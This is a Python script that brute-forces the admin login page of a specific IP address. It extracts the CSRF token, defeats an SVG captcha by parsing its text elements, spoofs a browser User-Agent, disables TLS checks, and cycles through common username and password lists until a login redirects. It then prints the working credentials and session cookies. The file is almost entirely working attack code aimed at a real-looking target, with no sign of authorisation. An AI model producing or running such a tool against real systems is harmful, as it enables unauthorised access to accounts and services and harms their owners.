#!/usr/bin/env python3
"""
Admin login brute force test for https://210.69.42.55/admin/login
Extracts CSRF token and captcha from SVG, tests common credentials
"""

import requests
import re
import string
from lxml import etree

TARGET = "https://210.69.42.55"
LOGIN_URL = f"{TARGET}/admin/login"
CAPTCHA_URL = f"{TARGET}/admin/captcha"

# Common admin credentials
USERNAMES = [
    "admin", "administrator", "root", "superadmin", "manager",
    "admin1", "admin01", "sysadmin", "webmaster", "root", "user"
]

PASSWORDS = [
    "admin", "admin123", "123456", "password", "root", "toor",
    "administrator", "administrator123", "12345678", "qwerty",
    "abc123", "password1", "admin!", "changeme", "Passw0rd",
    "letmein", "welcome", "monkey", "dragon", "master",
    "login", "abc", "guest", "test", "root123", "admin@"
]

def extract_captcha_text(svg_content):
    """Extract text characters from SVG captcha, ordered by x position"""
    try:
        # Parse SVG
        parser = etree.XMLParser()
        tree = etree.fromstring(svg_content, parser)
        
        # Find all text elements
        text_elements = tree.xpath("//text")
        
        # Sort by x position (left to right)
        chars = []
        for elem in text_elements:
            x = float(elem.get('x', 0))
            text = elem.text if elem.text else ''
            if text and text.strip():
                chars.append((x, text.strip()))
        
        # Sort and concatenate
        chars.sort(key=lambda x: x[0])
        return ''.join(c[1] for c in chars)
    except Exception as e:
        # Fallback: simple regex extraction
        chars = re.findall(r'>\s*([A-Z0-9])\s*<', svg_content)
        # Try to preserve order by looking at x attribute
        matches = re.findall(r'<text[^>]*x="(\d+)"[^>]*>([^<]+)</text>', svg_content)
        if matches:
            matches.sort(key=lambda x: int(x[0]))
            return ''.join(m[1].strip() for m in matches)
        return ''.join(chars)

def get_session():
    """Create a session and get initial tokens"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Get login page
    resp = session.get(LOGIN_URL, verify=False)
    
    # Extract CSRF token
    match = re.search(r'name="_token" value="([^"]+)"', resp.text)
    if match:
        csrf_token = match.group(1)
    else:
        csrf_token = None
    
    # Get captcha
    captcha_resp = session.get(CAPTCHA_URL, verify=False)
    captcha_text = extract_captcha_text(captcha_resp.content)
    
    return session, csrf_token, captcha_text

def attempt_login(session, csrf_token, username, password, captcha):
    """Attempt login with provided credentials"""
    data = {
        '_token': csrf_token,
        'username': username,
        'password': password,
        'captcha': captcha
    }
    
    resp = session.post(LOGIN_URL, data=data, allow_redirects=False, verify=False)
    return resp

def main():
    print("[*] Testing admin login endpoint")
    print(f"[*] Target: {LOGIN_URL}")
    
    # Get initial session
    session, csrf_token, captcha = get_session()
    print(f"[*] CSRF Token: {csrf_token}")
    print(f"[*] Captcha: {captcha}")
    
    # Test credential combinations
    print("\n[*] Testing credentials...")
    
    for username in USERNAMES:
        for password in PASSWORDS:
            # Refresh captcha for each attempt (it's time-based)
            _, _, captcha = get_session()
            
            resp = attempt_login(session, csrf_token, username, password, captcha)
            
            if resp.status_code == 302:
                # Check where it redirects
                location = resp.headers.get('Location', '')
                if 'login' not in location:
                    print(f"[+] SUCCESS! {username}:{password}")
                    print(f"[+] Redirected to: {location}")
                    return username, password, session.cookies.get_dict()
            elif resp.status_code == 419:
                print("[-] CSRF token expired, refreshing...")
                session, csrf_token, captcha = get_session()
    
    print("[-] No valid credentials found")
    return None, None, None

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()